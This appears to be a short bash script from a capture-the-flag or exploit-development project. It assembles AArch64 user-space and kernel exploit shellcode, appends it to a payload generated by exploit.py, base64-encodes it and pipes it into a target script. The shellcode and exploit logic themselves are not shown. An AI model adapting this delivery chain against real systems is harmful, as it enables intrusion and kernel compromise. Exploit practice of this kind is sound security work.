#!/bin/bash

# First doing for user space!

aarch64-linux-gnu-as exploit_userspace.S -o exploit_userspace.o
aarch64-linux-gnu-objcopy -O binary exploit_userspace.o exploit_userspace.bin
rm exploit_userspace.o
python3 exploit.py
cat exploit_userspace.bin >> payload
rm exploit_userspace.bin
base64 payload | tr -d \\n > input
rm payload
echo " " >> input
./x.sh < input
rm input

# This time going for Kernel!

aarch64-linux-gnu-as exploit_kernel.S -o exploit_kernel.o
aarch64-linux-gnu-objcopy -O binary exploit_kernel.o exploit_kernel.bin
rm exploit_kernel.o
python3 exploit.py
cat exploit_kernel.bin >> payload
rm exploit_kernel.bin
base64 payload | tr -d \\n > input
rm payload
echo " " >> input
./x.sh < input
rm input
